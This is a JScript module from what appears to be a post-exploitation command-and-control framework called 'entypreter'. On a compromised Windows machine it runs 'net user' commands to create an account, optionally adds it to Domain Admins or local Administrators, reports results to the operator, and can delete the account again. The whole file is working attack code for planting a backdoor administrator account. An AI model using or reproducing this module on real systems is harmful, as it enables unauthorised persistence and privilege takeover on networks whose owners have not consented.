try
{

    var headers = {};

    if (~CLEANUP~)
    {
        var del_user_command = "net user ~USERNAME~ /DEL";
        var output = entypreter.shell.exec(del_user_command, "~DIRECTORY~\\"+entypreter.uuid()+".txt");
        headers["Task"] = "DeleteUser";
        entypreter.work.report(output, headers);
    }
    else
    {
        var add_user_command = "net user ~USERNAME~ ~PASSWORD~ /ADD";
        if (~DOMAIN~)
        {
            add_user_command += " /DOMAIN";
        }
        var output = entypreter.shell.exec(add_user_command, "~DIRECTORY~\\"+entypreter.uuid()+".txt");
        headers["Task"] = "CreateUser";
        entypreter.work.report(output, headers);
        if (output.indexOf("error") != -1)
        {
            throw "";
        }

        if (~ADMIN~)
        {
            if (~DOMAIN~)
            {
                output = entypreter.shell.exec("net group \"Domain Admins\" ~USERNAME~ /ADD /DOMAIN", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
            }
            else
            {
                output = entypreter.shell.exec("net localgroup Administrators ~USERNAME~ /ADD", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
            }
            headers["Task"] = "MakeAdmin";
            entypreter.work.report(output, headers);
        }
    }

    entypreter.work.report("Complete");

}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
